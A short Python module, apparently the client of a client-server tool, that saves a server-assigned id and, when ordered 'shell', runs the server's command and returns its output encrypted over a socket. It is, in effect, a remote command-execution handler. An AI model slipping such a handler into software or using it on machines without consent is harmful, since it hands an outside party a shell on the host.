from src.ClientSide.saveId import saveId
from src.ClientSide.execCommand import execCommand
from src.ServerCom.encryptData import encryptData

def callManager(Query, socket, clientId, str_key):
    if "id" in Query:
        saveId(str(Query["id"]))
        returnQuery = '{"head":{"id":"%s"},"body":{"message":"Id saved successfully"}}' %(Query["id"])
        socket.mysend(encryptData(str_key, returnQuery))
        if clientId == False:
            clientId = Query["id"]
        return "Id saved"
    
    elif "order" in Query:
        if Query["order"] == "shell":
            print("Comanda rebuda:", Query["command"])
            output = execCommand(Query["command"])
            output = output.replace("\n", "\\n")
            returnQuery = '{"head":{"id":"%s"},"body":{"message":"Command executed", "command":"%s", "output":"%s"}}' %(clientId, Query["command"], output)
            socket.mysend(encryptData(str_key, returnQuery))
            return "Comanda del servidor"
    else:
        return "None executed"